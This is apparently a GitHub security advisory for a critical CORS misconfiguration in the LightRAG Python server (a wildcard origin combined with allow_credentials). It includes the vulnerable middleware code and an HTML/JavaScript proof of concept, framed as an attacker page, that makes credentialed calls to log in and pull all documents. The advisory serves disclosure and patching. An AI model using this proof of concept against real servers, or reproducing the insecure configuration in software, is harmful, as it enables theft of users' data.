# [C] LightRAG: CORS Wildcard + Credentials Enables Any-Origin Credentialed Requests

## Summary
Severity: Critical
Advisory: GHSA-6x6h-qqr7-855w
CVE: CVE-2026-61736
CWE: CWE-942
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N (CVSS_V3)
Published: 2026-07-20
Source: https://github.com/advisories/GHSA-6x6h-qqr7-855w
Type: github-advisory

## Affected
- PyPI: `lightrag-hku` — affected >=0 <1.5.4

## Details
### Summary
The server defaults to CORS_ORIGINS=* combined with allow_credentials=True. Starlette's CORSMiddleware echoes the requesting origin in preflight responses when credentials are enabled, meaning every origin is effectively whitelisted for credentialed cross-origin requests. Any malicious website can perform authenticated API calls on behalf of a logged-in user.

### Details

```python
# lightrag/api/config.py:639
args.cors_origins = get_env_value("CORS_ORIGINS", "*")  # default wildcard

# lightrag/api/lightrag_server.py:1379
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],       # any origin
    allow_credentials=True,   # credentials — PROBLEM with wildcard
    allow_methods=["*"],
    allow_headers=["*"],
)

# Starlette CORSMiddleware (confirmed in source):
# preflight_explicit_allow_origin = not allow_all_origins or allow_credentials
# = not True or True = True  → echoes the requesting origin back, not "*"
# Result: every origin receives Access-Control-Allow-Credentials: true
```

### PoC

Host on any origin. Open in browser where user is logged in to LightRAG:

```html
<!-- attacker.com/steal.html -->
<script>
const TARGET = "http://lightrag-server:9621";
(async () => {
  // Get victim token (or re-use existing session)
  const r1 = await fetch(`${TARGET}/login`, {
    method: "POST", credentials: "include",
    headers: {"Content-Type": "application/x-www-form-urlencoded"},
    body: "username=victim&password=known_pass"
  });
  const { access_token } = await r1.json();

  // Exfiltrate all documents
  const docs = await (await fetch(`${TARGET}/documents`, {
    credentials: "include",
    headers: { Authorization: `Bearer ${access_token}` }
  })).json();
  console.log("STOLEN DOCS:", docs);
})();
</script>
```

### Impact
Permissive cross-domain policy (CWE-942). Any website visited by an authenticated LightRAG user can silently make authenticated API requests, exfiltrating all documents and knowledge graph data or performing destructive actions such as deleting the entire document store.

## References
- https://github.com/HKUDS/LightRAG/security/advisories/GHSA-6x6h-qqr7-855w
- https://nvd.nist.gov/vuln/detail/CVE-2026-61736
- https://github.com/HKUDS/LightRAG/pull/3317
- https://github.com/HKUDS/LightRAG/commit/09567a4c983f580050db63569dd477122c058c3d
- https://github.com/HKUDS/LightRAG/commit/df68d75f9dc29dd340ffb6794b48f48c4fdc9a2d
- https://github.com/HKUDS/LightRAG/commit/ebba6548639c0f2e8919100eff76b401f1222252
- https://github.com/HKUDS/LightRAG
- https://github.com/HKUDS/LightRAG/releases/tag/v1.5.4
